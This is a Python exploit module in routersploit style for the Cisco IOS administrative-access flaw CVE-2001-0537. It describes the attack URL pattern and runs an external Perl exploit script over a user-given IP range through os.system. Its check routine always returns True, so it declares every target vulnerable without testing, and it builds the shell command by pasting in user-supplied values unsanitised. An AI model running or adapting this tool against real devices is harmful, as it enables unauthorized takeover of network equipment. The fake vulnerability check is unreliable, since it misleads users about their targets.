
import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient
from ctypes import *


class Exploit(HTTPClient):



    __info__ = {

        "name": "CVE-2001-0537",

        "description": "IOS is router firmware developed and distributed by Cisco Systems.  "
                       "IOS functions on numerous Cisco devices, including routers and switches. "
                       "It is possible to gain full remote administrative access on devices using affected releases of IOS. "
                       "By using a URL of http://router.address/level/$NUMBER/exec/.... where $NUMBER is an integer between 16 and 99,"
                       "it is possible for a remote user to gain full administrative access.This problem makes "
                       "it possible for a remote user to gain full administrative privileges,which may lead to  "
                       "further compromise of the network or result in a denial of service.",

        "authors": (

            "###",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/20977",

        ),

        "devices": (

            "Cisco, CVE-2001-0537"
        ),
    }


    startIP = OptIP("", "IPv4 or IPv6 address, must be a Class B or C network")
    endIP = OptIP("", "IPv4 or IPv6 address,must be a Class B or C network")
    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = 'perl {} {} {}'.format('CVE-2001-0537.pl',self.startIP,self.endIP)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:


            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
